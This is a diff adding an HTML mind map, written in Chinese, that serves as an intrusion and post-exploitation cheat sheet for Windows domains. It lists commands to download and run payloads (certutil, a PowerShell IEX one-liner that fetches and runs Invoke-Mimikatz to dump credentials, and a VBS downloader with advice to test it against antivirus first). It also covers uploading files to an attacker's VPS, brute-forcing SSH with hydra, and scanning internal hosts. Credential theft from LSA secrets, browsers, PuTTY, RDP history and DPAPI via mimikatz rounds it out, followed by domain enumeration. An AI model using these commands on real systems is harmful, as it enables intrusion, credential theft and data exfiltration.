+<li><span id="show1_21_2" class="foldclosed" onClick="show_folder('1_21_2')" style="POSITION: absolute">+</span> <span id="hide1_21_2" class="foldopened" onClick="hide_folder('1_21_2')">-</span>
+certutil
+<ul id="fold1_21_2" style="POSITION: relative; VISIBILITY: visible;"><li> certutil -urlcache -split -f http://domain.com/1.exe %temp%\1.exe
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_21_3" class="foldclosed" onClick="show_folder('1_21_3')" style="POSITION: absolute">+</span> <span id="hide1_21_3" class="foldopened" onClick="hide_folder('1_21_3')">-</span>
+<span style="color: #111111;">wput</span>
+<ul id="fold1_21_3" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">wput "Directory or file" ftp://ftpusername:password@ip/</span>
+<ul><li><span style="color: #111111;">http://wput.sourceforge.net/</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_21_4" class="foldclosed" onClick="show_folder('1_21_4')" style="POSITION: absolute">+</span> <span id="hide1_21_4" class="foldopened" onClick="hide_folder('1_21_4')">-</span>
+<span style="color: #111111;">wget</span>
+<ul id="fold1_21_4" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">wget -c -r -nd -np http://www.domainname.com/filename.exe</span>
+<ul><li><span style="color: #111111;">http://www.interlog.com/~tcharron/wgetwin.html</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">aria2c</span>
+<ul><li><span style="color: #111111;">http://aria2.github.io/</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_21_5" class="foldclosed" onClick="show_folder('1_21_5')" style="POSITION: absolute">+</span> <span id="hide1_21_5" class="foldopened" onClick="hide_folder('1_21_5')">-</span>
+<span style="color: #111111;">Powershell</span>
+<ul id="fold1_21_5" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Powershel&#19979;&#36733;
+<br>
+powershell (New-Object System.Net.WebClient).DownloadFile('http://xxx.com/1.exe','1.exe')
+<br>
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_21_6" class="foldclosed" onClick="show_folder('1_21_6')" style="POSITION: absolute">+</span> <span id="hide1_21_6" class="foldopened" onClick="hide_folder('1_21_6')">-</span>
+<span style="color: #111111;">VBS&#33050;&#26412;
+<br>
+vbs&#19979;&#36733;&#33050;&#26412;&#24120;&#34987;&#26576;&#20123;&#23433;&#20840;&#36719;&#20214;&#26597;&#26432;&#65292;&#23454;&#38469;&#20351;&#29992;&#26102;&#35831;&#20808;&#26412;&#22320;&#27979;&#35797;&#20813;&#26432;&#24773;&#20917;</span>
+<ul id="fold1_21_6" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">cscript download.vbs http://yoursite.com/1.exe
+<br>
+function GetHttpFile(url) 
+<br>
+ &nbsp;&nbsp;&nbsp;dim m,s 
+<br>
+m="Microsoft.XMLHTTP" 
+<br>
+s="ADODB.Stream" 
+<br>
+ &nbsp;&nbsp;&nbsp;FileName=LCase(mid(url,InStrRev(url, "/")+1)) 
+<br>
+Set xml = CreateObject(m) 
+<br>
+xml.Open "GET",url,False 
+<br>
+xml.Send 
+<br>
+with CreateObject(s) 
+<br>
+.type=1 
+<br>
+.open 
+<br>
+.write xml.responseBody 
+<br>
+.savetofile ".\"&amp;FileName,2 
+<br>
+end with 
+<br>
+set xml=Nothing 
+<br>
+end function 
+<br>
+Set objArgs = WScript. Arguments
+<br>
+If objArgs.count &gt;0 Then &nbsp;&nbsp;
+<br>
+	GetHttpFile(objArgs(0))
+<br>
+End If</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_21_7" class="foldclosed" onClick="show_folder('1_21_7')" style="POSITION: absolute">+</span> <span id="hide1_21_7" class="foldopened" onClick="hide_folder('1_21_7')">-</span>
+<span style="color: #111111;">nc&#20256;&#25991;&#20214;</span>
+<ul id="fold1_21_7" style="POSITION: relative; VISIBILITY: visible;"><li>&#26080;&#27861;&#36890;&#30693;&#32467;&#26463;&#21644;&#23481;&#26131;&#21463;&#24178;&#25200;
+<br>
+&#25509;&#25910;&#31471;
+<br>
+nc -l -p 8080 &gt; filename.rar
+<br>
+&#21457;&#36865;&#31471;
+<br>
+nc &nbsp;ip 8080 &lt; &nbsp;filename.rar
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_21_8" class="foldclosed" onClick="show_folder('1_21_8')" style="POSITION: absolute">+</span> <span id="hide1_21_8" class="foldopened" onClick="hide_folder('1_21_8')">-</span>
+<span style="color: #111111;">FTP</span>
+<ul id="fold1_21_8" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">FTP&#33258;&#21160;&#19979;&#36733;&#37197;&#32622;&#25991;&#20214;
+<br>
+ftp -s:ftp.conf
+<br>
+open vps
+<br>
+user
+<br>
+password
+<br>
+bin
+<br>
+cd /up
+<br>
+put C:\temp\11.exe
+<br>
+bye</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">Tftp</span>
+
+</li>
+<li><span id="show1_21_9" class="foldclosed" onClick="show_folder('1_21_9')" style="POSITION: absolute">+</span> <span id="hide1_21_9" class="foldopened" onClick="hide_folder('1_21_9')">-</span>
+scp
+<ul id="fold1_21_9" style="POSITION: relative; VISIBILITY: visible;"><li><p>&#38656;&#35201;&#20132;&#20114;&#36755;&#20837;&#23494;&#30721;&#65292;&#25110;&#32773;&#20351;&#29992;&#23494;&#38053;
+<br>
+&#19978;&#20256;
+<br>
+scp /path/local_filename username@server:/path
+<br>
+&#19979;&#36733;
+<br>
+scp username@server:/path/remote_file /tmp/local_destination
+<br>
+&#25335;&#36125;&#26412;&#22320;&#25991;&#20214;&#21040;&#36828;&#31243;tmp&#30446;&#24405;&#19979;,&#25351;&#23450;&#31471;&#21475;&#20026;80&#65288;&#26576;&#20123;&#30446;&#26631;&#21482;&#26377;80&#33021;&#20986;&#26469;&#65289;
+<br>
+PSCP.EXE -i privatekey.ppk -P 80 localfile.zip jusier@vps:/tmp/
+<br>
+&#26174;&#31034;&#36755;&#20837;&#23494;&#30721;
+<br>
+pscp -l root -pw 123456 localfile.zip vps:/tmp/
+<br>
+
+</li>
+</ul>
+</li>
+<li><span id="show1_21_10" class="foldclosed" onClick="show_folder('1_21_10')" style="POSITION: absolute">+</span> <span id="hide1_21_10" class="foldopened" onClick="hide_folder('1_21_10')">-</span>
+rsync
+<ul id="fold1_21_10" style="POSITION: relative; VISIBILITY: visible;"><li>server
+<br>
+rsync --port 80 --daemon
+<br>
+client
+<br>
+rsync -avz --port=80 filename 192.168.6.44::upload/
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li>&#25193;&#22823;&#25112;&#22330;
+<ul><li><span id="show1_22" class="foldclosed" onClick="show_folder('1_22')" style="POSITION: absolute">+</span> <span id="hide1_22" class="foldopened" onClick="hide_folder('1_22')">-</span>
+<span style="color: #111111;">&#25195;&#25551;&#20869;&#32593;&#23384;&#27963;&#20027;&#26426;&#65292;&#25195;&#25551;&#31471;&#21475;&#25235;&#21462;banner&#65292;&#32534;&#20889;&#25915;&#20987;&#33050;&#26412;&#25209;&#37327;&#25171;&#12290;</span>
+<ul id="fold1_22" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#32593;&#31449;&#20195;&#29702;</span>
+<ul><li><span id="show1_22_1" class="foldclosed" onClick="show_folder('1_22_1')" style="POSITION: absolute">+</span> <span id="hide1_22_1" class="foldopened" onClick="hide_folder('1_22_1')">-</span>
+<span style="color: #111111;">Glype (PHP)</span>
+<ul id="fold1_22_1" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#20869;&#32593;Web&#28183;&#36879;&#20195;&#29702;&#31070;&#22120;&#65292;&#27809;&#26377;&#20043;&#19968;
+<br>
+https://www.glype.com/</span>
+
+</li>
+
+</ul>
+</li>
+<li>&#26080;&#27861;&#20195;&#29702;&#30340;&#20351;&#29992;Curl&#35775;&#38382;&#20869;&#32593;&#26381;&#21153;&#22120;
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#21457;&#29616;&#23384;&#27963;&#20027;&#26426;</span>
+<ul><li><span id="show1_22_2" class="foldclosed" onClick="show_folder('1_22_2')" style="POSITION: absolute">+</span> <span id="hide1_22_2" class="foldopened" onClick="hide_folder('1_22_2')">-</span>
+<span style="color: #111111;">&#31471;&#21475;&#25195;&#25551;</span>
+<ul id="fold1_22_2" style="POSITION: relative; VISIBILITY: visible;"><li><span id="show1_22_2_1" class="foldclosed" onClick="show_folder('1_22_2_1')" style="POSITION: absolute">+</span> <span id="hide1_22_2_1" class="foldopened" onClick="hide_folder('1_22_2_1')">-</span>
+<span style="color: #111111;">s.exe</span>
+<ul id="fold1_22_2_1" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">TCP&#26041;&#24335;&#25195;&#25551;&#25235;&#21462;Banner&#24182;&#20445;&#23384;&#32467;&#26524;
+<br>
+s TCP 192.168.6.1 192.168.6.254 21,22,3389,1433,3306 3 /Banner /Save</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_22_2_2" class="foldclosed" onClick="show_folder('1_22_2_2')" style="POSITION: absolute">+</span> <span id="hide1_22_2_2" class="foldopened" onClick="hide_folder('1_22_2_2')">-</span>
+<span style="color: #111111;">nc</span>
+<ul id="fold1_22_2_2" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#25351;&#23450;&#31471;&#21475;&#33539;&#22260;&#25110;&#32773;&#31354;&#26684;&#20998;&#38548;&#35201;&#25195;&#25551;&#30340;&#31471;&#21475;&#65288;&#21482;&#33021;&#23545;&#21333;&#20010;IP&#36827;&#34892;&#25195;&#25551;&#65289;
+<br>
+nc.exe -v -z -n -w1 192.168.6.1 1-1023 | 3389 22 135 3306</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_22_2_3" class="foldclosed" onClick="show_folder('1_22_2_3')" style="POSITION: absolute">+</span> <span id="hide1_22_2_3" class="foldopened" onClick="hide_folder('1_22_2_3')">-</span>
+<span style="color: #111111;">Nmap</span>
+<ul id="fold1_22_2_3" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Nmap&#20813;&#23433;&#35013;&#29256; v6.0
+<br>
+&#38745;&#40664;&#23433;&#35013;&#25152;&#38656;&#24211;
+<br>
+vcredist_x86.exe /q
+<br>
+winpcap-nmap-4.13.exe /S
+<br>
+&#25195;&#25551;&#23384;&#27963;&#20027;&#26426;
+<br>
+nmap -v -sn 192.168.6.0/24
+<br>
+Download:
+<br>
+https://nmap.org/dist/nmap-7.12-win32.zip
+<br>
+</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_22_2_4" class="foldclosed" onClick="show_folder('1_22_2_4')" style="POSITION: absolute">+</span> <span id="hide1_22_2_4" class="foldopened" onClick="hide_folder('1_22_2_4')">-</span>
+masscan
+<ul id="fold1_22_2_4" style="POSITION: relative; VISIBILITY: visible;"><li>&#21333;&#25991;&#20214;&#20415;&#25658;&#24615;&#22909;&#65292;&#20294;&#24456;&#22810;&#26102;&#20505;&#20320;&#21487;&#33021;&#27809;&#26435;&#38480;&#23433;&#35013;&#20854;&#20381;&#36182;&#30340;libpcap&#21253;
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_22_2_5" class="foldclosed" onClick="show_folder('1_22_2_5')" style="POSITION: absolute">+</span> <span id="hide1_22_2_5" class="foldopened" onClick="hide_folder('1_22_2_5')">-</span>
+&#33258;&#20889;&#33050;&#26412;
+<ul id="fold1_22_2_5" style="POSITION: relative; VISIBILITY: visible;"><li>&#21487;&#33021;&#30001;&#20110;&#30340;&#20320;&#26435;&#38480;&#31561;&#38382;&#39064;&#65292;&#24456;&#22810;&#26102;&#20505;&#38656;&#35201;&#33258;&#20889;&#38024;&#23545;&#24615;&#30340;&#24037;&#20855;
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_22_3" class="foldclosed" onClick="show_folder('1_22_3')" style="POSITION: absolute">+</span> <span id="hide1_22_3" class="foldopened" onClick="hide_folder('1_22_3')">-</span>
+<span style="color: #111111;">Nbtscan</span>
+<ul id="fold1_22_3" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#33719;&#21462;&#20027;&#26426;NetBIOS&#21517;&#23383;
+<br>
+nbtstat -A 192.168.1.99
+<br>
+nbtscan 192.168.1.0/24
+<br>
+http://www.unixwiz.net/tools/nbtscan.html</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#24369;&#21475;&#20196;&#25195;&#25551;</span>
+<ul><li><span id="show1_22_4" class="foldclosed" onClick="show_folder('1_22_4')" style="POSITION: absolute">+</span> <span id="hide1_22_4" class="foldopened" onClick="hide_folder('1_22_4')">-</span>
+<span style="color: #111111;">Hydra </span>
+<ul id="fold1_22_4" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Windows&#19979;8.1&#29256;&#26412;&#25903;&#25345;ssh
+<br>
+hydra -l root -P /pass.txt 192.168.1.2 -t 4 ssh
+<br>
+hydra -l root -P /pass.txt -M /ip.txt ssh -t 4 
+<br>
+https://github.com/maaaaz/thc-hydra-windows/</span>
+</li>
+</ul>
+</li>
+<li>Tomcat
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#21028;&#26029;&#26159;&#21542;&#26159;&#30446;&#26631;&#22495;</span>
+<ul><li><span id="show1_23" class="foldclosed" onClick="show_folder('1_23')" style="POSITION: absolute">+</span> <span id="hide1_23" class="foldopened" onClick="hide_folder('1_23')">-</span>
+&#26597;&#30475;ip
+<ul id="fold1_23" style="POSITION: relative; VISIBILITY: visible;"><li>nslookup myip.opendns.com resolver1.opendns.com
+
+</li>
+
+</ul>
+</li>
+<li>&#26597;&#30475;DNS&#35299;&#26512;
+
+</li>
+<li><span id="show1_24" class="foldclosed" onClick="show_folder('1_24')" style="POSITION: absolute">+</span> <span id="hide1_24" class="foldopened" onClick="hide_folder('1_24')">-</span>
+DNS&#32531;&#23384;
+<ul id="fold1_24" style="POSITION: relative; VISIBILITY: visible;"><li>ipconfig /displaydns
+
+</li>
+
+</ul>
+</li>
+<li>tracert&#36335;&#30001;&#36319;&#36394;
+
+</li>
+<li><span id="show1_25" class="foldclosed" onClick="show_folder('1_25')" style="POSITION: absolute">+</span> <span id="hide1_25" class="foldopened" onClick="hide_folder('1_25')">-</span>
+<span style="color: #111111;">systeminfo</span>
+<ul id="fold1_25" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#26597;&#30475;&#30331;&#38470;&#26381;&#21153;&#22120;&#21517;
+<br>
+Domain: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ruos.org
+<br>
+Logon Server: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\WIN-1OQO62UPUD5</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_26" class="foldclosed" onClick="show_folder('1_26')" style="POSITION: absolute">+</span> <span id="hide1_26" class="foldopened" onClick="hide_folder('1_26')">-</span>
+<span style="color: #111111;">net time</span>
+<ul id="fold1_26" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">net time /domain (&#26597;&#30475;&#22495;&#25511;&#26102;&#38388;)
+<br>
+\\WIN-1OQO62UPUD5.ruos.org &#30340;&#24403;&#21069;&#26102;&#38388;&#26159;&nbsp;2016/9/22 17:14:47</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#33719;&#21462;&#25935;&#24863;&#20449;&#24687;</span>
+<ul><li><a href="#ID_998254306" target="_blank"><span class=l>~</span>&nbsp;<span style="color: #111111;">&#xa;    <p>&#xa;      &#25235;&#21462;&#23494;&#30721;&#65288;hash&#65289;<br >&#xa;    </p>&#xa;  </span>
+</a>
+<p><span id="show1_27" class="foldclosed" onClick="show_folder('1_27')" style="POSITION: absolute">+</span> <span id="hide1_27" class="foldopened" onClick="hide_folder('1_27')">-</span>
+<span style="color: #111111;">&#31995;&#32479;VPN</span>
+<ul id="fold1_27" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">Dialupass.exe</span>
+<ul><li><span style="color: #111111;">passrec&#22871;&#20214;&#40664;&#35748;&#19979;&#36733;&#21435;&#38500;&#20102;&#21629;&#20196;&#34892;&#21442;&#25968;
+<br>
+Dialupass.exe /stext dp.txt</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">LSASecretsDump</span>
+<ul><li><p><span style="color: #111111;">.pbk&#25991;&#20214;&#36335;&#24452;&#65292;PhoneNumber&#21442;&#25968;&#35760;&#24405;&#20102;VPN&#26381;&#21153;&#22120;&#22320;&#22336;
+<br>
+C:\Users\username\Application Data\Microsoft\Network\Connections\Pbk\rasphone.pbk
+<br>
+LSASecretsDump.exe &gt; c:\temp\lsa.txt
+<br>
+http://www.nirsoft.net</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">LsaSecretReader.exe</span>
+<ul><li><p><span style="color: #111111;">LsaSecretReader.exe DPAPI_SYSTEM
+<br>
+http://www.passcape.com/index.php?id=23&amp;section=docsys&amp;cmd=details#b6
+<br>
+http://www.passcape.com/download/LsaSecretReader.exe</span>
+</li>
+</ul>
+</li>
+
+</ul><p><span id="show1_28" class="foldclosed" onClick="show_folder('1_28')" style="POSITION: absolute">+</span> <span id="hide1_28" class="foldopened" onClick="hide_folder('1_28')">-</span>
+<span style="color: #111111;">&#32593;&#32476;&#23494;&#30721;</span>
+<ul id="fold1_28" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">netpass</span>
+
+</li>
+
+</ul><p><span id="show1_29" class="foldclosed" onClick="show_folder('1_29')" style="POSITION: absolute">+</span> <span id="hide1_29" class="foldopened" onClick="hide_folder('1_29')">-</span>
+<span style="color: #111111;">&#27983;&#35272;&#22120;&#25910;&#34255;&#22841;</span>
+<ul id="fold1_29" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">IE
+<br>
+C:\Documents and Settings\Administrator\Favorites
+<br>
+Chrome
+<br>
+xp
+<br>
+C:\Documents and Settings\&#29992;&#25143;&#21517;\Local Settings\Application Data\Google\Chrome
+<br>
+win7
+<br>
+C:\Users\&#29992;&#25143;&#21517;\AppData\Local\Google\Chrome\User Data\Default\Bookmarks
+<br>
+Firefox
+<br>
+C:\Users\&#29992;&#25143;&#21517;\AppData\Roaming\Mozilla\Firefox\Profiles\zvu7t3k2.default</span>
+</li>
+</ul><p>&#27983;&#35272;&#22120;&#20195;&#29702;
+<ul><li><span id="show1_30" class="foldclosed" onClick="show_folder('1_30')" style="POSITION: absolute">+</span> <span id="hide1_30" class="foldopened" onClick="hide_folder('1_30')">-</span>
+IE
+<ul id="fold1_30" style="POSITION: relative; VISIBILITY: visible;"><li><p>&#26597;&#35810;&#27880;&#20876;&#34920;&#38190;&#20540;
+<br>
+reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
+</li>
+</ul>
+</li>
+
+</ul><p><span id="show1_31" class="foldclosed" onClick="show_folder('1_31')" style="POSITION: absolute">+</span> <span id="hide1_31" class="foldopened" onClick="hide_folder('1_31')">-</span>
+<span style="color: #111111;">&#27983;&#35272;&#22120;&#23494;&#30721;</span>
+<ul id="fold1_31" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">ChromePass</span>
+
+</li>
+<li><span style="color: #111111;">iepv</span>
+
+</li>
+<li><span style="color: #111111;">PasswordFox</span>
+
+</li>
+<li><span style="color: #111111;">WebBrowserPassView</span>
+
+</li>
+<li><span style="color: #111111;">Cookies</span>
+
+</li>
+
+</ul><p><span id="show1_32" class="foldclosed" onClick="show_folder('1_32')" style="POSITION: absolute">+</span> <span id="hide1_32" class="foldopened" onClick="hide_folder('1_32')">-</span>
+<span style="color: #111111;">Putty&#20445;&#23384;&#30340;&#20250;&#35805;</span>
+<ul id="fold1_32" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">regedit /s putty.reg "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys"</span>
+
+</li>
+
+</ul><p>SecureCRT
+<p><span id="show1_33" class="foldclosed" onClick="show_folder('1_33')" style="POSITION: absolute">+</span> <span id="hide1_33" class="foldopened" onClick="hide_folder('1_33')">-</span>
+<span style="color: #111111;">&#36828;&#31243;&#26700;&#38754;&#21382;&#21490;&#35760;&#24405;</span>
+<ul id="fold1_33" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#27880;&#20876;&#34920;&#23548;&#20986;
+<br>
+reg export "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" tsc.reg </span>
+
+</li>
+
+</ul><p><span id="show1_34" class="foldclosed" onClick="show_folder('1_34')" style="POSITION: absolute">+</span> <span id="hide1_34" class="foldopened" onClick="hide_folder('1_34')">-</span>
+<span style="color: #111111;">PLSQL Developer&#37197;&#32622;&#25991;&#20214;</span>
+<ul id="fold1_34" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Oracle10g
+<br>
+/oracle/product/10.2.0/db_1/NETWORK/ADMIN/tnsnames.ora
+<br>
+Oracle9i
+<br>
+/oracle/ora90/network/admin/tnsnames.ora</span>
+</li>
+</ul><p><span style="color: #111111;">&#26597;&#30475;&#36830;&#25509; netstat -ano</span>
+<p><span id="show1_35" class="foldclosed" onClick="show_folder('1_35')" style="POSITION: absolute">+</span> <span id="hide1_35" class="foldopened" onClick="hide_folder('1_35')">-</span>
+&#20973;&#25454;&#31649;&#29702; cmdkey /l
+<ul id="fold1_35" style="POSITION: relative; VISIBILITY: visible;"><li><p>&#25351;&#23450;TargetName 
+<br>
+cmdkey /list:TERMSRV/192.168.6.2
+<br>
+&#33719;&#21462;&#20973;&#25454;
+<br>
+#dpapi::cred /in:C:\Users\%username%\AppData\Local\Microsoft\Credentials\351A6B41FF236DA02B66D511342FCD70
+<br>
+guidMasterKey &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: {3a7925be-750f-4025-8452-fa7860789914}
+<br>
+pbData &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: f0b2282d37e4f8eaa0db177f...
+<br>
+&#26597;&#25214;guid&#23545;&#24212;&#30340;MasterKey
+<br>
+#privilege::debug 
+<br>
+#sekurlsa::dpapi
+<br>
+[00000009]
+<br>
+ * GUID &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:	{3a7925be-750f-4025-8452-fa7860789914}
+<br>
+ * Time &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:	2017/10/23 9:22:58
+<br>
+ * MasterKey :	60278ba267735f130b70567689142cf8469a7c69860e5154063c7ff6a5941682582f1440f655f63d0a55f092ed011ea77d3bb31ab1bf1914872985dbc33fb65e
+<br>
+ * sha1(key) :	040439776eb2ab1eac6ac3fb135b64dc42d2ab58
+<br>
+&#35299;&#23494;
+<br>
+#dpapi::cred /in:C:\Users\%username%\AppData\Local\Microsoft\Credentials\05C281E4D77E6C8EB55FB4EF0A8E698D /masterkey:60278ba267735f130b70567689142cf8469a7c69860e5154063c7ff6a5941682582f1440f655f63d0a55f092ed011ea77d3bb31ab1bf1914872985dbc33fb65e
+</li>
+</ul><p><span style="color: #111111;">&#26597;&#30475;IP&#22320;&#22336; ipconfig /all</span>
+<p><span style="color: #111111;">&#24320;&#26426;&#26102;&#38388; net statistics WORKSTATION</span>
+<p>&#26597;&#30475;&#32593;&#32476;&#36335;&#30001;&#34920; route print -4
+<p><span style="color: #111111;">hosts&#25991;&#20214;</span>
+<p><span style="color: #111111;">&#32763;&#30475;&#25991;&#20214;</span>
+<p><span id="show1_36" class="foldclosed" onClick="show_folder('1_36')" style="POSITION: absolute">+</span> <span id="hide1_36" class="foldopened" onClick="hide_folder('1_36')">-</span>
+Linux
+<ul id="fold1_36" style="POSITION: relative; VISIBILITY: visible;"><li><p>&#21382;&#21490;&#35760;&#24405;
+<br>
+~/.bash_history
+<br>
+mysql
+<br>
+/var/lib/mysql
+<br>
+w
+<br>
+/var/run/utmp
+<br>
+last
+<br>
+/var/log/wtmp
+<br>
+lastb
+<br>
+/var/log/btmp
+<br>
+lastlog
+<br>
+/var/log/lastlog
+</li>
+</ul><p><span style="color: #111111;">&#38190;&#30424;&#35760;&#24405;&#22120;</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#38450;&#28779;&#22681;&#31867;&#22411;</span>
+<ul><li><span style="color: #111111;">&#21253;&#36807;&#28388;</span>
+
+</li>
+<li><span style="color: #111111;">&#24212;&#29992;&#23618;&#32593;&#20851;&#38450;&#28779;&#22681;</span>
+
+</li>
+<li><span style="color: #111111;">&#20195;&#29702;&#26381;&#21153;&#22411;&#38450;&#28779;&#22681;</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #00b439;font-size: 133%;font-family: SansSerif, sans-serif; ">&#22495;</span>
+<ul><li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#22495;&#25511;&#21046;&#22120;</span>
+<ul><li><span style="color: #111111;">&#33719;&#21462;&#22495;&#20449;&#24687;</span>
+<ul><li><span style="color: #111111;">&#24120;&#29992;&#24037;&#20855;</span>
+<ul><li><p><span id="show1_37" class="foldclosed" onClick="show_folder('1_37')" style="POSITION: absolute">+</span> <span id="hide1_37" class="foldopened" onClick="hide_folder('1_37')">-</span>
+<span style="color: #111111;">Dsquery
+<br>
+Queries the directory by using search criteria that you specify. </span>
+<ul id="fold1_37" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">dsquery computer - finds computers in the directory.
+<br>
+dsquery contact - finds contacts in the directory.
+<br>
+dsquery subnet - finds subnets in the directory.
+<br>
+dsquery group - finds groups in the directory.
+<br>
+dsquery ou - finds organizational units in the directory.
+<br>
+dsquery site - finds sites in the directory.
+<br>
+dsquery server - finds domain controllers in the directory.
+<br>
+dsquery user - finds users in the directory.
+<br>
+dsquery quota - finds quota specifications in the directory.
+<br>
+dsquery partition - finds partitions in the directory.
+<br>
+dsquery * - finds any object in the directory by using a generic LDAP query.
+<br>
+
+<br>
+&#26597;&#35810;&#35745;&#31639;&#26426;&#21517;&#23383;&#21253;&#21547;VM&#30340;&#26426;&#22120;&#65288;&#40664;&#35748;&#26159;&#20174;domainroot&#33410;&#28857;&#24320;&#22987;&#25628;&#32034;&#65289;
+<br>
+dsquery computer domainroot -limit 0 -o samid -name *VM*
+<br>
+&#26597;&#25214;&#22495;&#25511;&#21046;&#22120;&#65288;&#21451;&#22909;&#21517;&#23383;&#26174;&#31034;&#65289;
+<br>
+dsquery server -o rdn -forest 
+<br>
+&#22312;&#32452;&#32455;&#21333;&#20803;Test&#20013;&#26597;&#35810;&#20197;jon&#24320;&#22836;&#30340;&#29992;&#25143;
+<br>
+dsquery user OU=Test,DC=Contoso,DC=Com -o upn -name jon*
+<br>
+
+<br>
+Maybe this link could hellp you:
+<br>
+https://technet.microsoft.com/en-us/library/cc732952%28v=ws.11%29.aspx</span>
+</li>
+</ul><p><span id="show1_38" class="foldclosed" onClick="show_folder('1_38')" style="POSITION: absolute">+</span> <span id="hide1_38" class="foldopened" onClick="hide_folder('1_38')">-</span>
+<span style="color: #111111;">Dsget (&#36825;&#26159;&#19968;&#20010;&#24456;&#29992;&#29992;&#30340;&#21629;&#20196;&#65292;&#26597;&#35810;&#22495;&#31867;&#36164;&#28304;&#23646;&#24615;&#20449;&#24687;&#65292;&#27604;&#22914;&#25551;&#36848;&#20449;&#24687;)
+<br>
+Displays the selected properties of a specific object in the directory.</span>
+<ul id="fold1_38" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">dsget computer - displays properties of computers in the directory.
+<br>
+dsget contact - displays properties of contacts in the directory.
+<br>
+dsget subnet - displays properties of subnets in the directory.
+<br>
+dsget group - displays properties of groups in the directory.
+<br>
+dsget ou - displays properties of ou's in the directory.
+<br>
+dsget server - displays properties of servers in the directory.
+<br>
+dsget site - displays properties of sites in the directory.
+<br>
+dsget user - displays properties of users in the directory.
+<br>
+dsget quota - displays properties of quotas in the directory.
+<br>
+dsget partition - displays properties of partitions in the directory.
+<br>
+
+<br>
+dsquery computer -name *VM* | dsget computer -desc -c
+<br>
+dsquery user &nbsp;-limit 0 | dsget user &nbsp;-samid -display -email -desc -disabled -mgr -c
+<br>
+dsquery computer -limit 0 | dsget computer -samid -desc -c &nbsp;&gt; C:\dsget_pc.csv
+<br>
+
+<br>
+https://technet.microsoft.com/en-us/library/cc755162%28v=ws.11%29.aspx</span>
+</li>
+</ul><p><span id="show1_39" class="foldclosed" onClick="show_folder('1_39')" style="POSITION: absolute">+</span> <span id="hide1_39" class="foldopened" onClick="hide_folder('1_39')">-</span>
+<span style="color: #111111;">Net group
+<br>
+Adds, displays, or modifies global groups in domains.</span>
